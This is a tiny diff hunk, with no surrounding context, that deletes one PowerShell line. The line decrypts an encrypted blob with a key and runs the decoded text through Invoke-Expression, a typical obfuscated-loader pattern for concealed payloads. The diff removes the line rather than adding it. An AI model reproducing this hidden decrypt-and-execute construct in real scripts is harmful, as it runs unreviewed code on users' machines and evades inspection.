@@ -1,1 +1,0 @@
-Invoke-Expression ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR(($blob | ConvertTo-SecureString -Key $key))))
